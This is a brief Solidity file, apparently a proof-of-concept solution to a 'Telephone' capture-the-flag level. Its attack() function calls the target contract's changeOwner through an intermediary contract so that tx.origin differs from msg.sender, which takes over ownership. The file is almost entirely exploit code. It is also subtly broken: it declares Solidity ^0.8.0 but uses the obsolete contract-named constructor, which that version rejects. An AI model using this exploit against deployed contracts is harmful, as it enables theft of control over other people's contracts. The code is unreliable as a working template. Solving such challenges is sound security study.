// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract TelephonePoc {
    
    Telephone phone;
    
    function TelephonePoc(address aimAddr) public {
        phone = Telephone(aimAddr);
    }
    
    function attack(address _owner) public{
        phone.changeOwner(_owner);
    }
}